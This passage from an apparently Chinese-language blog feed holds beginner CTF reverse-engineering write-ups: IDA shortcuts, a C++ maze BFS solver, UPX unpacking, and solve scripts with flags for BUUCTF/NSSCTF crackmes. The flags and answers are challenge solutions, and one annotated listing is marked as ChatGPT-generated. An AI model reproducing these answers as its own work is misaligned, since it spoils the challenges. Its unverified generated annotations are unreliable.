class="type">bool</span> <span class="title">isValid</span><span class="params">(<span class="type">int</span> row, <span class="type">int</span> col)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 检查点是否在地图内并且是可行走的</span></span><br><span class="line">    <span class="keyword">return</span> row &gt;= <span class="number">0</span> &amp;&amp; row &lt; <span class="number">25</span> &amp;&amp; col &gt;= <span class="number">0</span> &amp;&amp; col &lt; <span class="number">25</span> &amp;&amp; maze[row][col] != <span class="string">&#x27;1&#x27;</span>;<span class="comment">//迷宫边界及墙 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    queue&lt;Point&gt; q;<span class="comment">//queue&lt; typename &gt; name ;　</span></span><br><span class="line">    q.<span class="built_in">push</span>(&#123; <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;&quot;</span> &#125;);  <span class="comment">// 将起点放入队列中,入队操作 </span></span><br><span class="line">    <span class="type">bool</span> visited[<span class="number">25</span>][<span class="number">26</span>] = &#123; <span class="literal">false</span> &#125;;</span><br><span class="line">    visited[<span class="number">0</span>][<span class="number">1</span>] = <span class="literal">true</span>;  <span class="comment">// 该变量用于记录图中的每个节点是否已被访问过，将入口点标为true </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        Point p = q.<span class="built_in">front</span>(); <span class="comment">//访问队首元素，即最早被压入队列的元素。 </span></span><br><span class="line">        q.<span class="built_in">pop</span>();<span class="comment">//队首元素出列 </span></span><br><span class="line"><span class="comment">//q.pop()弹出队列的第一个元素，但不会返回被弹出元素的值。所以要用p存储 q.front()的返回值 </span></span><br><span class="line">        <span class="type">int</span> row = p.row;</span><br><span class="line">        <span class="type">int</span> col = p.col;</span><br><span class="line">        string path = p.path;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否到终点了</span></span><br><span class="line">        <span class="keyword">if</span> (maze[row][col] == <span class="string">&#x27;E&#x27;</span>) &#123;</span><br><span class="line">            cout &lt;&lt; path &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//进行移动操作 </span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isValid</span>(row - <span class="number">1</span>, col) &amp;&amp; !visited[row - <span class="number">1</span>][col]) &#123;</span><br><span class="line">            q.<span class="built_in">push</span>(&#123; row - <span class="number">1</span>, col, path + <span class="string">&#x27;w&#x27;</span> &#125;);</span><br><span class="line">            visited[row - <span class="number">1</span>][col] = <span class="literal">true</span>;<span class="comment">//左移 </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isValid</span>(row + <span class="number">1</span>, col) &amp;&amp; !visited[row + <span class="number">1</span>][col]) &#123;</span><br><span class="line">            q.<span class="built_in">push</span>(&#123; row + <span class="number">1</span>, col, path + <span class="string">&#x27;s&#x27;</span> &#125;);</span><br><span class="line">            visited[row + <span class="number">1</span>][col] = <span class="literal">true</span>;<span class="comment">//右移 </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isValid</span>(row, col - <span class="number">1</span>) &amp;&amp; !visited[row][col - <span class="number">1</span>]) &#123;</span><br><span class="line">            q.<span class="built_in">push</span>(&#123; row, col - <span class="number">1</span>, path + <span class="string">&#x27;a&#x27;</span> &#125;);</span><br><span class="line">            visited[row][col - <span class="number">1</span>] = <span class="literal">true</span>;<span class="comment">//下移 </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isValid</span>(row, col + <span class="number">1</span>) &amp;&amp; !visited[row][col + <span class="number">1</span>]) &#123;</span><br><span class="line">            q.<span class="built_in">push</span>(&#123; row, col + <span class="number">1</span>, path + <span class="string">&#x27;d&#x27;</span> &#125;);</span><br><span class="line">            visited[row][col + <span class="number">1</span>] = <span class="literal">true</span>;<span class="comment">//上移 </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;No path found&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">bfs</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><strong><img src="../../img/image-20231124123738957.png" alt="image-20231124123738957"></strong></p><p>用<font color=Red>CyberChef</font>(可部署再本地)通过md5解密得出<img src="../../img/image-20231124124207304.png" alt="image-20231124124207304"></p><p>NSSCTF{69193150b15c87d39252d974bc323217}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_wp1</title>
      <link href="/2023/11/19/buuctf_re_WP/wp/"/>
      <url>/2023/11/19/buuctf_re_WP/wp/</url>
      
        <content type="html"><![CDATA[<h3 id="IDAPRO"><a href="#IDAPRO" class="headerlink" title="IDAPRO"></a>IDAPRO</h3><div class="table-container"><table><thead><tr><th style="text-align:left">快捷键</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">Esc</td><td style="text-align:left">回到上一个位置</td></tr><tr><td style="text-align:left">Enter</td><td style="text-align:left">跳转到当前光标处的地址</td></tr><tr><td style="text-align:left">-</td><td style="text-align:left">折叠代码</td></tr><tr><td style="text-align:left">+</td><td style="text-align:left">展开代码</td></tr><tr><td style="text-align:left">*</td><td style="text-align:left">创建一个结构</td></tr><tr><td style="text-align:left">Alt + A</td><td style="text-align:left">手动定义一个数组</td></tr><tr><td style="text-align:left">Alt + F</td><td style="text-align:left">寻找直接引用的函数</td></tr><tr><td style="text-align:left">Alt + G</td><td style="text-align:left">跳转到特定的地址</td></tr><tr><td style="text-align:left">Alt + T</td><td style="text-align:left">搜索</td></tr><tr><td style="text-align:left">Alt + X</td><td style="text-align:left">重命名</td></tr><tr><td style="text-align:left">Ctrl + G</td><td style="text-align:left">快速跳转到指定地址</td></tr><tr><td style="text-align:left">Ctrl + J</td><td style="text-align:left">显示引用列表</td></tr><tr><td style="text-align:left">Ctrl + K</td><td style="text-align:left">显示 XREF 到选中的函数/数据</td></tr><tr><td style="text-align:left">Ctrl + N</td><td style="text-align:left">创建一个函数</td></tr><tr><td style="text-align:left">Ctrl + Q</td><td style="text-align:left">快速重命名</td></tr><tr><td style="text-align:left">Ctrl + X</td><td style="text-align:left">显示从选中的函数/数据的 XREF</td></tr><tr><td style="text-align:left">Ctrl + E</td><td style="text-align:left">显示结构类型</td></tr><tr><td style="text-align:left">Ctrl + R</td><td style="text-align:left">手动定义一个数据结构</td></tr><tr><td style="text-align:left">Ctrl + W</td><td style="text-align:left">打开函数列表</td></tr><tr><td style="text-align:left">Ctrl + D</td><td style="text-align:left">以十进制显示当前值</td></tr><tr><td style="text-align:left">Ctrl + B</td><td style="text-align:left">以二进制显示当前值</td></tr><tr><td style="text-align:left">Ctrl + H</td><td style="text-align:left">以十六进制显示当前值</td></tr><tr><td style="text-align:left">Space</td><td style="text-align:left">在图形/文本视图中切换</td></tr><tr><td style="text-align:left">shift + f12</td><td style="text-align:left">打开字符串窗口</td></tr><tr><td style="text-align:left">F5</td><td style="text-align:left">转伪C代码</td></tr></tbody></table></div><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>Exeinfo PE查壳</p><p><img src="../../img/image-20231117214430774.png" alt="image-20231117214430774"></p><p>64位，用ida64打开</p><p><img src="../../img/image-20231117214439772.png" alt="image-20231117214439772"></p><p>F5反汇编</p><p><img src="../../img/image-20231117214448149.png" alt="image-20231117214448149"></p><p>直接可得flag，程序通过判断输入的数a，b相等来输出flag，不过由于没有system.pause函数，窗口在输出flag后会直接关闭</p><h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h3><p><img src="../../img/image-20231117214457031.png" alt="image-20231117214457031"></p><p><img src="../../img/image-20231117214510389.png" alt="image-20231117214510389"></p><h4 id="int-cdecl-main-int-argc-const-char-argv-const-char-envp"><a href="#int-cdecl-main-int-argc-const-char-argv-const-char-envp" class="headerlink" title="int __cdecl main(int argc, const char argv, const char envp)"></a>int __cdecl main(int argc, const char <strong>argv, const char </strong>envp)</h4><p>这里的<code>label int __cdecl main(int argc, const char **argv, const char **envp)</code>是main函数的完全格式</p><p><font color=Red>argc</font>是执行程序时的命令行参数个数。</p><p><font color=Red>argv</font>是具体的参数</p><p><font color=Red>envp</font>是系统的环境变量，很少有介绍的。“名称=值”的形式，以NULL结束。</p><p><font color=Red> _cdecl</font> 是C和C++中默认的调用约定。</p><blockquote><p>参数从右向左依次入栈。</p><p>调用方负责清理堆栈。</p><p>编译后的函数名前缀以一个下划线字符</p></blockquote><p><a href="https://www.cnblogs.com/clover-toeic/p/3756668.html">C语言函数调用栈(二) - clover_toeic - 博客园 (cnblogs.com)</a></p><p>F5反汇编后，进去main_0函数看一下</p><p><img src="../../img/image-20231117214958376.png" alt="image-20231117214958376"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for ( j = 0; ; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v10 = j;</span><br><span class="line">  if ( j &gt; j_strlen(Str2) )</span><br><span class="line">    break;</span><br><span class="line">  if ( Str2[j] == 111 )</span><br><span class="line">    Str2[j] = 48;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码将str2的O转化为0，可以按R键将ASCII码转化为字符</p><p><img src="../../img/image-20231117215213573.png" alt="image-20231117215213573"></p><p><img src="../../img/image-20231117215230431.png" alt="image-20231117215230431"></p><p>!strncmp()表示两个字符串相等</p><p><img src="../../img/image-20231117215707859.png" alt="image-20231117215707859"></p><p><img src="../../img/image-20231117220023782.png" alt="image-20231117220023782"></p><p>点开str2可以看到字符串数据</p><p>将o换成0得出flag{hell0_w0rld}</p><h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h3><p><img src="../../img/image-20231117222342312.png" alt="image-20231117222342312"></p><p>可以看到是elf文件</p><p>用ida打开她</p><p><img src="../../img/image-20231117223034333.png" alt="image-20231117223034333"></p><p><img src="../../img/image-20231120213617202.png" alt="image-20231120213617202"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="string">&#x27;&#123;hacking_for_fun&#125;&#x27;</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> flag[i] == <span class="string">&#x27;i&#x27;</span> <span class="keyword">or</span> flag[i] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">        flag[i]=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure><p>flag{hack1ng_fo1_fun}</p><p><code>__readfsqword(0x28u)</code> 是一个用于读取FS段偏移地址0x28处无符号64位（qword）值的操作。</p><p>fs寄存器，通常用于实现线程本地存储（Thread Local Storage，TLS）。</p><p>常用于多线程编程，其中每个线程可以有自己的本地存储区域.r</p><p>编译libc时，编译器会自动将其转换为<code>scanf</code>中的<code>__isoc99_scanf</code>函数</p><p><a href="https://www.cnblogs.com/love-jelly-pig/p/8471206.html">fork()函数详解 - _NewMan - 博客园 (cnblogs.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pid_t fpid;</span><br><span class="line"></span><br><span class="line">fpid = fork();</span><br><span class="line"></span><br><span class="line">  **1）在父进程中，fork返回新创建子进程的进程ID；**</span><br><span class="line">  **2）在子进程中，fork返回0；**</span><br><span class="line">  **3）如果出现错误，fork返回一个负值；**</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/Roland_Sun/article/details/32084825">Linux中waitpid()函数的用法_linux waitpid函数用法-CSDN博客</a>从博客中了解到如果在调用waitpid()函数时，当指定等待的子进程已经停止运行或结束了，则waitpid()会立即返回；但是如果子进程还没有停止运行或结束，则调用waitpid()函数的父进程则会被阻塞，暂停运行。</p><p><img src="../../img/image-20231121213012496.png" alt="image-20231121213012496"></p><p>分析得出folk()出子进程后，<font color=Red>if(pid)</font>判断当前进程是否为子进程，因为子进程调用的folk函数的返回值为0，因此进入else语句进行字符替换。父进程因为folk()函数返回子进程的进程id，所以执行waitpid()函数进入阻塞状态，暂停运行。当子进程执行完后，父进程继续执行，所以有两次flag输入与判断。</p><p> 我们试着在ubuntu上运行elf文件，可以输入两次flag，第一次正确flag为{hack1ng_fo1_fun}，第二次正确flag为{hacking_for_fun}，所以说我们的推断是正确的。</p><p><img src="../../img/image-20231120230826944.png" alt="image-20231120230826944"></p><p>flag{hack1ng_fo1_fun}</p><h3 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h3><p><img src="../../img/image-20231121214552174.png" alt="image-20231121214552174"></p><p>32位，ida打开，F5，main函数直接看到flag</p><p><img src="../../img/image-20231121214702335.png" alt="image-20231121214702335"></p><h3 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h3><p><img src="../../img/image-20231121214851517.png" alt="image-20231121214851517"></p><p>upx壳，直接upx -d</p><p><img src="../../img/image-20231121215141561.png" alt="image-20231121215141561"></p><p>ida打开</p><p><img src="../../img/image-20231121215521999.png" alt="image-20231121215521999"></p><p>flag{HappyNewYear!}                                                                                                                                                                                                                                                                                                         </p><p><img src="../../img/image-20231121215606989.png" alt="image-20231121215606989"></p><p><img src="../../img/image-20231121215716907.png" alt="image-20231121215716907"></p><h4 id="通过x32dbg手脱upx壳"><a href="#通过x32dbg手脱upx壳" class="headerlink" title="通过x32dbg手脱upx壳"></a>通过x32dbg手脱upx壳</h4><p>详情可见此博客<a href="https://www.cnblogs.com/i6288/p/16982223.html">BUUCTF 新年快乐 脱壳工具与手动脱壳 - M4r1s4 - 博客园 (cnblogs.com)</a></p><p><a href="http://www.manongjc.com/detail/64-ilojvxvdaywqacj.html">http://www.manongjc.com/detail/64-ilojvxvdaywqacj.html</a></p><p><a href="https://www.52pojie.cn/thread-326995-1-1.html">https://www.52pojie.cn/thread-326995-1-1.html</a></p><p>笔者还在学习脱壳ing，贴几张博客。</p><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>发现题目有__MACOSX文件夹</p><blockquote><p><code>__MACOSX</code> 是 macOS 操作系统下的一个隐藏文件夹，它通常出现在存储着文件或文件夹的 ZIP 压缩包中。这个文件夹包含了与 macOS 系统相关的元数据和资源文件，例如图标、预览缩略图等。这些文件和文件夹在 macOS 上可能会有一些额外的属性或资源，而这些额外的信息就被存储在 <code>__MACOSX</code> 文件夹中。</p><p>在大多数情况下，如果你从 macOS 系统上打包文件或文件夹，并将其发送给其他操作系统的用户（例如 Windows 或 Linux 用户），<code>__MACOSX</code> 文件夹对于接收者来说可能没有实际用途。因此，在跨平台分享文件时，有时人们可能会删除或忽略 <code>__MACOSX</code> 文件夹。</p></blockquote><p>能得知出题人用的是mac。</p><p>我们直接看题目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-124h]</span></span><br><span class="line">  <span class="type">char</span> __b[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-110h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(__b, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag:\n&quot;</span>);</span><br><span class="line">  get_line(__b, <span class="number">256LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(__b) != <span class="number">33</span> )<span class="comment">//flag长度为33，若不为33，直接goto输出false</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )</span><br><span class="line">    __b[i] ^= __b[i - <span class="number">1</span>];<span class="comment">// 从输入的第二位开始，将其与前一位异或</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(__b, global, <span class="string">&#x27;!&#x27;</span>) )<span class="comment">//与global</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击global进入文本视图</p><p>一下为chatGPT生成，仅供参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__data:0000000100001050                               ; ===========================================================================</span><br><span class="line">__data:0000000100001050</span><br><span class="line">__data:0000000100001050                               ; Segment type: Pure data</span><br><span class="line">;‘;’通常表示一个注释,Pure data 表示这个段是用于存储纯粹的数据</span><br><span class="line">__data:0000000100001050                               ; Segment permissions: Read/Write</span><br><span class="line">;Read/Write 表示该段具有读写权限。</span><br><span class="line">__data:0000000100001050                               __data segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">;__data: 这是__data段。</span><br><span class="line">;qword: 这表示这个段中的数据将以64位的大小进行存储。</span><br><span class="line">;public: 这表示这个段是公共的，可以被其他模块或文件访问。</span><br><span class="line">;&#x27;DATA&#x27;: 段的数据类型</span><br><span class="line">;use64: 这个指令表示使用64位模式。在64位汇编中，寄存器和地址等都使用64位宽度。</span><br><span class="line">__data:0000000100001050                               assume cs:__data</span><br><span class="line">;它起到协助编译器的作用，它是将codesg与cs寄存器关联起来。</span><br><span class="line">__data:0000000100001050                               ;org 100001050h</span><br><span class="line">;表示将程序的起始地址或偏移量设置为 100001050h。</span><br><span class="line">__data:0000000100001050                               public _global</span><br><span class="line">;public _global: 表示 _global 是一个公共的标识符，可以被其他模块或文件访问。</span><br><span class="line">__data:0000000100001050                               ; char *global</span><br><span class="line">__data:0000000100001050 6E 0F 00 00 01 00 00 00       _global dq offset aFKWOXZUPFVMDGH       ; </span><br><span class="line">;dq 指令通常用于声明变量或者数据块。</span><br><span class="line">;_global dq offset aFKWOXZUPFVMDGH: 这行代码定义了一个 qword 大小的全局变量 _global，它的值被初始化为字符串 aFKWOXZUPFVMDGH 的偏移量（offset）。这个偏移量通常是指向内存中存储字符串的位置。这样的声明表明 _global 被视为一个指向字符串的指针。</span><br><span class="line">DATA XREF: _main+10D↑r</span><br><span class="line">;DATA XREF: 这是一个标记，表示这是数据交叉引用。</span><br><span class="line">;_main+10D: 这表示在 _main 函数的地址偏移为 10D 处。</span><br><span class="line">;↑r: 这可能表示引用的类型。</span><br><span class="line">__data:0000000100001050                               __data ends                             ; &quot;f\nk\fw&amp;O.@\x11x\rZ;U\x11p\x19F\x1Fv\&quot;M&quot;...；数据</span><br><span class="line">__data:0000000100001050</span><br></pre></td></tr></table></figure><p>shift+E</p><p><img src="../../img/image-20231122211926034.png" alt="image-20231122211926034"></p><p>解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">code=[</span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x0A</span>, <span class="number">0x6B</span>, <span class="number">0x0C</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x4F</span>, <span class="number">0x2E</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, </span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x3B</span>, <span class="number">0x55</span>, <span class="number">0x11</span>, <span class="number">0x70</span>, <span class="number">0x19</span>, <span class="number">0x46</span>, <span class="number">0x1F</span>, </span><br><span class="line">  <span class="number">0x76</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0x23</span>, <span class="number">0x44</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x06</span>, <span class="number">0x68</span>, <span class="number">0x0F</span>, </span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0x32</span>, <span class="number">0x4F</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line">flag=<span class="built_in">chr</span>(code[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(code)-<span class="number">1</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(code[i]^code[i-<span class="number">1</span>])</span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag{QianQiuWanDai_YiTongJiangHu}</p><h3 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h3><p><img src="../../img/image-20231123225255045.png" alt="image-20231123225255045"></p><p>apk文件，用<font color=Red>jadx-gui</font>打开，点击MainActivity看到flag</p><p><img src="../../img/image-20231123225352858.png" alt="image-20231123225352858"></p><h3 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h3><p>shift+f12发现特征码，也可使用ida插件findcrypt3</p><p><img src="../../img/image-20231124230122625.png" alt="image-20231124230122625"></p><h4 id="常见算法特征识别"><a href="#常见算法特征识别" class="headerlink" title="常见算法特征识别"></a>常见算法特征识别</h4><p><img src="../../img/7908d90b314fca621076f790480dcc6.jpg" alt="7908d90b314fca621076f790480dcc6"></p><p><img src="../../img/image-20231124230627119.png" alt="image-20231124230512864"></p><p>sub_4110BE函数有三个参数，输入的str，str的长度和v14，进入函数，明显的base64加解密</p><p><img src="../../img/image-20231124231005059.png" alt="image-20231124231005059"></p><p>对输入的字符串每个与其下标相加，最后与str2比较,最后的<font color=Red>,0</font>是字符串的结尾标志</p><p><img src="../../img/image-20231124231718584.png" alt="image-20231124231718584"></p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">list=[&#x27;e&#x27;,&#x27;3&#x27;,&#x27;n&#x27;,&#x27;i&#x27;,&#x27;f&#x27;,&#x27;I&#x27;,&#x27;H&#x27;,&#x27;9&#x27;,&#x27;b&#x27;,&#x27;_&#x27;,&#x27;C&#x27;,&#x27;@&#x27;,&#x27;n&#x27;,&#x27;@&#x27;,&#x27;d&#x27;,&#x27;H&#x27;,&#x27;0&#x27;]</span><br><span class="line">for i in range(len(list)):</span><br><span class="line">    list[i]=chr(ord(list[i])-i)</span><br><span class="line">a=&#x27;&#x27;.join(list)</span><br><span class="line">print( base64.b64decode(a).decode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">#b = base64.b64encode(s.encode(&#x27;utf-8&#x27;))加密</span><br><span class="line">#b = base64.b64decode(b).decode(&#x27;utf-8&#x27;)解密</span><br></pre></td></tr></table></figure><p><img src="../../img/image-20231125224828512.png" alt="image-20231125224828512"></p><p>0加上去和不加上去都一样，因为base64是将3字节（24位比特）按照其值选择”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/“中的字符输出，会把不足3字节的剩下的比特补0。</p><p><img src="../../img/image-20231125224859687.png" alt="image-20231125224859687"></p><h3 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h3><p><img src="../../img/image-20231125225527731.png" alt="image-20231125225527731"></p><p>运行程序，应该是一道迷宫题</p><p>进入main函数</p><p><img src="../../img/image-20231125232414703.png" alt="image-20231125232414703"></p><p>发现迷宫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br></pre></td></tr></table></figure><p>flag{222441144222}</p><p>假设我们有一只小鼠，我们对在迷宫的移动进行分析。我们发现，当我们左右移动时<font color=Red>v4</font>会做加减运算，上下移动时，会改变<font color=Red>v3[25]</font>的值。来看判断语句<code>5 * *(_DWORD *)&amp;v3[25] - 41 + v4] == &#39;#&#39;</code>可以简化为<code>`将我们上下左右移动的值进行运算，我们将终点&lt;font color=Red&gt;#&lt;/font&gt;的值v4=4，v3[25]=4,运算得出</code>v7[-17]`，</p><p>v7[12]     ebp-Ch</p><p>v3[29]    ebp-35h</p><p>35h-Ch=41，即v7[-41]为v3数组的首元素</p><p>我们通过计算得出v7[-17]=’*’</p><p><img src="../../img/image-20231125235231197.png" alt="image-20231125235231197"></p><p>判断v3[25]和v3[29]即v4的值不大于0x5，即不走出迷宫范围（5*5）</p><h3 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h3><p><img src="../../img/image-20231127173618282.png" alt="image-20231127173618282"></p><p>WP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> key[] = <span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line"><span class="type">char</span> text[] = <span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> v3=<span class="number">10</span>;/</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">128</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (j &lt; <span class="string">&#x27;A&#x27;</span> || j &gt; <span class="string">&#x27;z&#x27;</span> || j &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; j &lt; <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((j - <span class="number">39</span> - key[v3 % <span class="number">10</span>] + 